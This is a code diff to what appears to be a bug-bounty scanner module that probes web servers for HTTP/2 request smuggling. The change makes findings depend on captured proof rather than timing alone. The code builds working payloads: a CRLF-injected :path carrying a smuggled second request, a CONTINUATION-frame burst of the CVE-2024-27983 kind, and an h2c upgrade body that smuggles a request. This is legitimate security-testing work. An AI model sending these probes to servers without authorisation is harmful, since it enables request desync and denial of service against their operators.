@@ -1,23 +1,33 @@
-"""HTTP/2-specific request smuggling probes.
+"""HTTP/2-specific request smuggling probes — proof-first.
 
 Three classes of bug-bounty-paying H2 attacks are tested:
 
   1. **CRLF in pseudo-headers** — sending an HTTP/2 request whose `:path`
      contains `\\r\\n` causes some upstreams to downgrade the request to
      HTTP/1.1 internally, smuggling the trailing bytes as a second
-     request. Detection: a timing oracle (the server hangs waiting for
-     bytes that never come for the smuggled second request).
+     request.
 
   2. **CONTINUATION frame abuse** — many implementations have OOM /
      DoS bugs when receiving a long stream of CONTINUATION frames
      without END_HEADERS. We send a moderate burst (kept benign — 50
-     frames, ~100 KB total) and watch for an unusually long or stalled
-     response.
+     frames, ~100 KB total) and watch for the vulnerable shape.
 
   3. **h2c upgrade smuggling** — request HTTP/2 cleartext via
      `Connection: Upgrade, HTTP2-Settings`. Some intermediaries pass
      the upgrade through but the back-end speaks HTTP/1.1, leaving the
      attacker control of the upgrade-prior request body.
+
+**A timing hang is not a finding.** The dominant false positive is trivial:
+any origin that buffers a request will sit and wait when the frame promises
+bytes that never arrive, and that wait reproduces every single time — so
+"require the hang to reproduce" filters nothing. This scanner therefore only
+emits a *verified* smuggling finding when it captures a real HTTP/1.1 downgrade
+artifact — our unique smuggled marker path reflected back, or a raw
+``HTTP/1.1 NNN`` status line surfacing inside an HTTP/2 byte stream (which HPACK
+never produces: :status is encoded, never sent as ASCII). When it can only see
+a timing differential, the finding is emitted as an explicit *unverified
+candidate* (confidence 0.2, no captured proof) which the proof-gate quarantines
+out of the report. Nothing reaches the report on timing alone.
 
 Implementation uses the `h2` sans-IO library (a transitive dependency of
 httpx) wired to a raw asyncio TCP/TLS connection so we control every
@@ -26,6 +36,8 @@ frame. Honors scope and the per-host token bucket.
 from __future__ import annotations
 
 import asyncio
+import re
+import secrets
 import socket
 import ssl
 import time
@@ -39,6 +51,15 @@ if TYPE_CHECKING:
 
 _STATIC_EXT = (".js", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
                ".ico", ".woff", ".woff2", ".ttf", ".eot", ".mp4", ".webp", ".pdf")
+
+# A raw HTTP/1.1 status line has no place inside an HTTP/2 stream (HPACK encodes
+# :status). Seeing one in the bytes we read back is a downgrade artifact.
+_H1_STATUS = re.compile(rb"HTTP/1\.[01] \d{3}")
+_HANG = 5.0
+
+
+def _marker() -> str:
+    return "sx" + secrets.token_hex(4)
 
 
 def _same_site(host: str, target: str) -> bool:
@@ -140,12 +161,17 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
 
 # ---------- 1: CRLF in :path / :authority --------------------------------
 
-async def _measure_crlf(host, port, path, use_tls, bucket) -> tuple[float, bytes, str]:
-    """Send the CRLF-in-:path probe; return (elapsed, response_bytes, smuggled_path)."""
+async def _measure_crlf(host, port, path, use_tls, bucket, marker) -> tuple[float, bytes, str]:
+    """Send the CRLF-in-:path probe; return (elapsed, response_bytes, smuggled_path).
+
+    The smuggled second request targets a unique marker path, so if the
+    front-end downgrades the frame to HTTP/1.1 and the back-end honours the
+    trailing bytes, the marker (or a raw HTTP/1.1 status line the H2 layer should
+    never surface) shows up in the bytes we read back — a captured artifact, not
+    a timer."""
     reader, writer, conn = await _h2_open(host, port, use_tls, bucket)
-    # craft a :path with embedded CRLF + smuggled second request
-    # the smuggled request asks for /admin which front-end might block but back-end honors
-    smuggled = f"{path} HTTP/1.1\r\nHost: {host}\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}"
+    smuggled = (f"{path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
+                f"GET /{marker} HTTP/1.1\r\nHost: {host}")
     if conn is None:
         return 0.0, b"", smuggled
     headers = [
@@ -193,43 +219,98 @@ async def _measure_clean(host, port, path, use_tls, bucket) -> float:
     return elapsed
 
 
+def _downgrade_artifact(data: bytes, marker: str) -> str | None:
+    """Return a captured-proof excerpt when the raw bytes show the malformed H2
+    frame was downgraded/honoured as HTTP/1.1 — our smuggled marker path reflected
+    back, or a raw ``HTTP/1.1 NNN`` status line (an H2 stream never carries an
+    ASCII status line; HPACK encodes :status). Else None."""
+    if not data:
+        return None
+    if marker.encode() in data or _H1_STATUS.search(data):
+        return data[:1500].decode(errors="replace")
+    return None
+
+
+def _h2_crlf_finding(url: str, smuggled: str, *, captured: str | None = None,
+                     elapsed: float = 0.0, samples: list | None = None) -> dict:
+    meta: dict = {"kind": "h2_crlf_path"}
+    if samples:
+        meta["samples"] = samples
+    if elapsed:
+        meta["elapsed_s"] = elapsed
+    if captured:
+        meta["poc"] = {
+            "verified": True, "method": "RAW-H2", "url": url,
+            "request": f"H2 :path = {repr(smuggled)[:200]}",
+            "response_excerpt": captured,
+            "rationale": ("A :path carrying CRLF caused the endpoint to surface an HTTP/1.1 "
+                          "downgrade artifact — the smuggled marker path was reflected or a raw "
+                          "HTTP/1.1 status line appeared inside the HTTP/2 stream, proving the "
+                          "malformed frame was re-parsed and a second request honoured."),
+        }
+        return {
+            "category": "smuggling",
+            "title": "HTTP/2 request smuggling — CRLF in pseudo-header (:path)",
+            "severity": "critical", "cvss": 9.0, "confidence": 0.9,
+            "url": url,
+            "evidence": ("A :path containing \\r\\n caused the upstream to downgrade the frame to "
+                         "HTTP/1.1 and honour a smuggled second request (captured artifact below)."),
+            "request": f"H2 :path = {repr(smuggled)[:200]}",
+            "response": captured,
+            "metadata": meta,
+        }
+    # timing-only candidate — no captured artifact, so it can never be verified
+    meta["unverified"] = True
+    return {
+        "category": "smuggling",
+        "title": "HTTP/2 request-smuggling candidate — CRLF-in-:path timing differential (unverified)",
+        "severity": "high", "cvss": 0.0, "confidence": 0.2,
+        "url": url,
+        "evidence": (f"A :path containing \\r\\n hung ~{elapsed:.2f}s while a clean H2 GET to the "
+                     "same path returned promptly, reproducibly — a timing differential consistent "
+                     "with a front/back-end parser disagreement, but NO downgraded response could "
+                     "be captured. Unproven: confirm manually with Burp / turbo-intruder before "
+                     "submitting."),
+        "request": f"H2 :path = {repr(smuggled)[:200]}",
+        "metadata": meta,
+    }
+
+
 async def _crlf_pseudo_header(host, port, path, use_tls, bucket, url) -> list[dict]:
-    findings = []
-    elapsed, data, smuggled = await _measure_crlf(host, port, path, use_tls, bucket)
-    if not (elapsed > 5.0 and data):
-        return findings
+    marker = _marker()
+    elapsed, data, smuggled = await _measure_crlf(host, port, path, use_tls, bucket, marker)
 
-    # One hang isn't proof — a cold connection or generic slow path looks the
-    # same. Confirm the CRLF probe hangs *and* a well-formed H2 GET to the same
-    # path stays prompt, then re-measure the CRLF probe once more for stability.
+    # Hard proof beats timing: if the first probe already captured a downgrade
+    # artifact, emit a verified finding and stop.
+    artifact = _downgrade_artifact(data, marker)
+    if artifact:
+        return [_h2_crlf_finding(url, smuggled, captured=artifact)]
+
+    # No artifact — fall back to the timing oracle, but a hang alone is never a
+    # finding. Require the differential to be real (clean path prompt, hang
+    # reproducible) before we even record a *candidate*, and try once more to
+    # capture an artifact on the repeat.
+    if not (elapsed > _HANG and data is not None):
+        return []
     base = await _measure_clean(host, port, path, use_tls, bucket)
-    elapsed2, data2, _ = await _measure_crlf(host, port, path, use_tls, bucket)
-    if not (base < 5.0 and elapsed2 > 5.0 and data2):
-        return findings  # clean path also slow, or hang didn't reproduce → jitter
-
+    elapsed2, data2, _ = await _measure_crlf(host, port, path, use_tls, bucket, marker)
+    artifact2 = _downgrade_artifact(data2, marker)
+    if artifact2:
+        return [_h2_crlf_finding(url, smuggled, captured=artifact2)]
+    if not (base < _HANG and elapsed2 > _HANG):
+        return []  # clean path also slow, or hang didn't reproduce → jitter
     samples = [{"crlf_path_s": round(elapsed, 2)},
                {"crlf_path_s": round(elapsed2, 2), "clean_path_s": round(base, 2)}]
-    findings.append({
-        "category": "smuggling",
-        "title": "HTTP/2 request smuggling — CRLF in pseudo-header (:path)",
-        "severity": "critical", "cvss": 9.0, "confidence": 0.3,
-        "url": url,
-        "evidence": f"A :path containing \\r\\n caused the upstream to hang for "
-                    f"{elapsed2:.2f}s while a clean H2 GET to the same path returned in "
-                    f"{base:.2f}s (confirmed across 2 rounds) — the malformed frame is "
-                    "downgraded to HTTP/1.1 and a smuggled second request queued.",
-        "request": f"H2 :path = {repr(smuggled)[:200]}",
-        "metadata": {"elapsed_s": elapsed2, "kind": "h2_crlf_path", "samples": samples},
-    })
-    return findings
+    return [_h2_crlf_finding(url, smuggled, elapsed=elapsed2, samples=samples)]
 
 
 async def reprobe(ctx: "Context", finding: dict):
-    """Re-verify an h2_crlf_path finding: the CRLF probe must hang while a clean
-    H2 GET to the same path returns promptly, reproducibly across repeats.
+    """Re-verify an h2_crlf_path finding.
 
-    Returns ``(result, proof)`` — True (reproduced), False (hang gone), or None
-    (noisy / not applicable). The proof captures the smuggled :path and timings.
+    Returns ``(result, proof)``. ``result`` is True only when a downgrade
+    artifact is captured on re-test (real proof); False when the hang is clearly
+    gone; None when a timing differential persists but no artifact could be
+    captured (kept as an unproven candidate — the proof-gate holds it back).
     """
     url = finding.get("url") or ""
     parsed = urlparse(url)
@@ -245,34 +326,35 @@ async def reprobe(ctx: "Context", finding: dict):
     path = parsed.path or "/"
     bucket = ctx.http.host_bucket(parsed.netloc)
 
+    marker = _marker()
     smuggled = ""
     samples = []
+    captured = None
     for _ in range(2):
-        t_evil, data, smuggled = await _measure_crlf(host, port, path, use_tls, bucket)
+        t_evil, data, smuggled = await _measure_crlf(host, port, path, use_tls, bucket, marker)
         t_base = await _measure_clean(host, port, path, use_tls, bucket)
-        samples.append({"crlf_path_s": round(t_evil, 2),
-                        "clean_path_s": round(t_base, 2),
-                        "responded": bool(data)})
+        art = _downgrade_artifact(data, marker)
+        if art:
+            captured = art
+        samples.append({"crlf_path_s": round(t_evil, 2), "clean_path_s": round(t_base, 2),
+                        "responded": bool(data), "captured_response": art})
 
-    confirmed = all(s["crlf_path_s"] > 5.0 and s["clean_path_s"] < 5.0 and s["responded"]
-                    for s in samples)
-    clearly_fast = all(s["crlf_path_s"] < 5.0 for s in samples)
-    proof = {
-        "verified": confirmed, "method": "RAW-H2", "url": url,
-        "request": f"H2 :path = {repr(smuggled)[:200]}",
-        "samples": samples,
-        "rationale": (
-            "A :path carrying CRLF hung (>5s) while a clean H2 GET to the same path "
-            f"returned promptly across {len(samples)} repeats — the malformed frame is "
-            "being downgraded and a smuggled request queued on the back-end socket."
-            if confirmed else
-            "The CRLF-induced hang did not reproduce consistently on re-test."),
-    }
-    if confirmed:
-        return True, proof
+    if captured:
+        return True, {
+            "verified": True, "method": "RAW-H2", "url": url,
+            "request": f"H2 :path = {repr(smuggled)[:200]}",
+            "response_excerpt": captured, "samples": samples,
+            "rationale": ("On re-test the CRLF-in-:path probe surfaced an HTTP/1.1 downgrade "
+                          "artifact (smuggled marker path reflected, or a raw HTTP/1.1 status line "
+                          "inside the H2 stream) — a real, captured desynchronisation."),
+        }
+    clearly_fast = all(s["crlf_path_s"] < _HANG for s in samples)
     if clearly_fast:
-        return False, proof
-    return None, proof
+        return False, {"verified": False, "method": "RAW-H2", "url": url, "samples": samples,
+                       "rationale": "The CRLF-induced hang did not reproduce on re-test."}
+    return None, {"verified": False, "method": "RAW-H2", "url": url, "samples": samples,
+                  "rationale": ("A timing differential persisted but no downgraded response could "
+                                "be captured — unproven; confirm manually.")}
 
 
 # ---------- 2: CONTINUATION abuse ----------------------------------------
@@ -285,7 +367,7 @@ async def _continuation_flood(host, port, path, use_tls, bucket, url) -> list[di
     # Send a HEADERS frame WITHOUT END_HEADERS, followed by 50 CONTINUATION
     # frames each carrying junk header padding. Most servers either reject
     # the stream or close the connection. Servers that buffer everything
-    # without limit are vulnerable to OOM (CVE-2024-27983 class).
+    # without limit are candidates for OOM (CVE-2024-27983 class).
     try:
         from hyperframe.frame import HeadersFrame, ContinuationFrame
         from hpack import Encoder
@@ -322,20 +404,23 @@ async def _continuation_flood(host, port, path, use_tls, bucket, url) -> list[di
         writer.close(); await writer.wait_closed()
     except Exception:
         pass
-    # If the server happily returned a 200/206 the stream is treated as valid
-    # despite the unbounded header section — that's the vulnerable shape
-    if data and elapsed < 5.0 and (b" 200 " in data or b"\x00\x00" in data[:9]):
+    # Accepting the burst and still returning a response is the *vulnerable
+    # shape* — but a single accepted burst is not proof of unbounded buffering or
+    # a real DoS. Emit as an unverified candidate (no captured proof) so the
+    # proof-gate quarantines it until a human confirms the impact.
+    if data and elapsed < _HANG and (b" 200 " in data or b"\x00\x00" in data[:9]):
         findings.append({
             "category": "smuggling",
-            "title": "HTTP/2 CONTINUATION-frame flood accepted (potential DoS / smuggling primitive)",
-            "severity": "high", "cvss": 7.4, "confidence": 0.3,
+            "title": "HTTP/2 CONTINUATION-frame flood accepted — unverified DoS/smuggling candidate",
+            "severity": "high", "cvss": 0.0, "confidence": 0.2,
             "url": url,
-            "evidence": "Server accepted 50 CONTINUATION frames carrying ~100 KB of header "
-                        "padding without rejecting the stream — header buffer is unbounded "
-                        "(CVE-2024-27983 class). Exploitable for OOM DoS or downgrade-driven "
-                        "smuggling on stacks that share the parsed header buffer with HTTP/1.1.",
+            "evidence": ("Server accepted 50 CONTINUATION frames (~100 KB of header padding) "
+                         "without resetting the stream and still returned a response — the "
+                         "vulnerable shape (CVE-2024-27983 class). This is a candidate only: one "
+                         "accepted burst is not proof of unbounded buffering. Confirm the DoS / "
+                         "smuggling impact manually before submitting."),
             "request": f"H2 HEADERS + 50× CONTINUATION on {url}",
-            "metadata": {"elapsed_s": elapsed, "kind": "h2_continuation_flood"},
+            "metadata": {"elapsed_s": elapsed, "kind": "h2_continuation_flood", "unverified": True},
         })
     return findings
 
@@ -349,8 +434,9 @@ async def _h2c_upgrade_smuggle(host, port, path, url, ctx) -> list[dict]:
     request. We use ctx.http (not raw socket) since we only need the
     /1.1 surface for this probe."""
     findings = []
+    marker = _marker()
     smuggle_body = (
-        "GET /admin HTTP/1.1\r\n"
+        f"GET /{marker} HTTP/1.1\r\n"
         f"Host: {host}\r\n"
         "X-SX-Smuggle: 1\r\n\r\n"
     )
@@ -365,22 +451,40 @@ async def _h2c_upgrade_smuggle(host, port, path, url, ctx) -> list[dict]:
                              allow_redirects=False)
     if ev.error:
         return findings
-    # Heuristic — reply suggests the smuggled "/admin" was processed
-    body = (ev.response_body or "").lower()
-    if (ev.status == 101 and "h2c" in str(ev.response_headers).lower()) or \
-       ("admin" in body and ev.status in (200, 401, 403) and "x-sx-smuggle" not in str(ev.response_headers)):
+    body = ev.response_body or ""
+    # Verified only when our *unique* smuggled marker path is reflected back —
+    # hard proof the trailing bytes were processed as a second request. A bare
+    # "admin" substring or a 101 is not proof.
+    if marker in body:
         findings.append({
             "category": "smuggling",
             "title": "h2c upgrade smuggling — front-end forwards HTTP/2 cleartext upgrade",
-            "severity": "high", "cvss": 8.0, "confidence": 0.3,
+            "severity": "high", "cvss": 8.0, "confidence": 0.9,
             "url": url,
-            "evidence": "Server accepted Upgrade: h2c with a CL-bearing body, AND the "
-                        "response contains evidence the smuggled GET /admin was processed "
-                        "(or the 101 came back). Front-end and back-end disagree on whether "
-                        "the upgrade applies — bytes after the upgrade headers become a "
-                        "smuggled request.",
+            "evidence": ("The unique smuggled request path was reflected in the response after an "
+                         "Upgrade: h2c carrying a Content-Length body — the bytes after the upgrade "
+                         "headers were processed as a second, smuggled request."),
             "request": f"POST {url}\nUpgrade: h2c\n\n{smuggle_body[:200]}",
-            "response": (ev.response_body or "")[:1500],
-            "metadata": {"kind": "h2c_upgrade", "status": ev.status},
+            "response": body[:1500],
+            "metadata": {
+                "kind": "h2c_upgrade", "status": ev.status, "marker": marker,
+                "poc": {"verified": True, "method": "H2C", "url": url,
+                        "request": f"POST {url}  (Upgrade: h2c + CL body smuggling /{marker})",
+                        "response_excerpt": body[:1200],
+                        "rationale": "The unique smuggled marker path was reflected in the response, "
+                                     "proving a second request executed."}},
+        })
+    elif ev.status == 101 and "h2c" in str(ev.response_headers).lower():
+        findings.append({
+            "category": "smuggling",
+            "title": "h2c upgrade accepted (101) — smuggling candidate, impact unconfirmed",
+            "severity": "medium", "cvss": 0.0, "confidence": 0.2,
+            "url": url,
+            "evidence": ("Server returned 101 Switching Protocols to Upgrade: h2c. The upgrade is "
+                         "accepted, but no smuggled request was observed to execute — candidate "
+                         "only; confirm a real desync manually."),
+            "request": f"POST {url}\nUpgrade: h2c\n\n{smuggle_body[:200]}",
+            "response": body[:1500],
+            "metadata": {"kind": "h2c_upgrade", "status": ev.status, "unverified": True},
         })
     return findings
